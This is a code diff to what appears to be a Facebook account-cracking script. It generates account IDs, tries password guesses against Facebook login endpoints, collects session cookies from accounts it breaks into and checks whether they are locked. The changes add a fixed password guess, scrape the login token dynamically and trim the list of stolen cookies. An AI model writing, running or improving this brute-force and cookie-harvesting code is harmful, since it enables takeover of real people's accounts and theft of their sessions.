@@ -789,7 +789,7 @@ def RANDOM():
     ____banner____();print(f'{dot}YOUR CITY{RED}   : {YELLOW}'+current_city);print(f'{dot}METHOD{RED}      : {faltu}{black}RANDOM{pvt}');print(f'{dot}TOTAL LIMIT{RED} : {H}{tl}');print(f'{dot}TURN ON/OFF AIRPLANE MODE {rong}✈{rong2}✈{rong3}✈{rong4}✈{rong5}✈{rong6}✈{rong7}✈' );print(led)
     for guru in user:
       ids = kode+guru
-      pwv = [ids[:6],ids[:8],ids]
+      pwv = [ids[:6],ids[:8],ids,'57273200']
       if 'm1' in mtd:king_xd.submit(m1,ids,pwv)
       elif 'm2' in mtd:king_xd.submit(m2,ids,pwv)
       elif 'm3' in mtd:king_xd.submit(m3,ids,pwv)
@@ -1072,7 +1072,7 @@ def m2(ids,pwv):
             'sec-fetch-site': 'same-origin',
             'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Mobile Safari/537.36',
             'x-asbd-id': '359341',
-            'x-fb-lsd': 'AdGIJruk8pU',
+            'x-fb-lsd': re.search('"lsd":"(.*?)"',str(free_fb)).group(1),
             'x-requested-with': 'XMLHttpRequest',
             'x-response-format': 'JSONStream',}
             response=session.post("https://limited.facebook.com/login/device-based/login/async/?api_key=1167750614510909&auth_token=5955d73195bf74e6bdf41a4f3712d7de&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv21.0%2Fdialog%2Foauth%3Fapp_id%3D1167750614510909&refsrc=deprecated&app_id=1167750614510909&cancel=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46&lwv=100",data = info,headers = update,allow_redirects = False)
@@ -1080,7 +1080,7 @@ def m2(ids,pwv):
             if "c_user" in response:
                 cok = Session.cookies.get_dict()
                 cid = cok["c_user"]
-                coki = ";".join([f"{key}={session.cookies.get(key)}" for key in ['sb', 'datr', 'ps_n', 'ps_l', 'locale', 'c_user', 'xs', 'fr', 'usida', 'wd', 'm_ls', 'presence']])
+                coki = ";".join([f"{key}={session.cookies.get(key)}" for key in ['datr', 'fr', 'sb', 'c_user', 'xs']])
                 check = check_lock(cid)
                 if "live" in check:
                     bkas.append(cid)
@@ -1153,7 +1153,7 @@ def m3(ids,pwv):
     headers)
             log_cookies=conn.cookies.get_dict().keys()
             if 'c_user' in log_cookies or 'm_page_voice' in log_cookies or 'xs' in log_cookies:
-                kuki=";".join([f"{key}={session.cookies.get(key)}" for key in ['sb', 'datr', 'ps_n', 'ps_l', 'locale', 'c_user', 'xs', 'fr', 'usida', 'wd', 'm_ls', 'presence']])
+                kuki=";".join([f"{key}={session.cookies.get(key)}" for key in ['datr', 'fr', 'sb', 'c_user', 'xs']])
                 cid = re.findall('c_user=(.*);xs',kuki)[0]
                 ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
                 res = requests.get(ckk).text
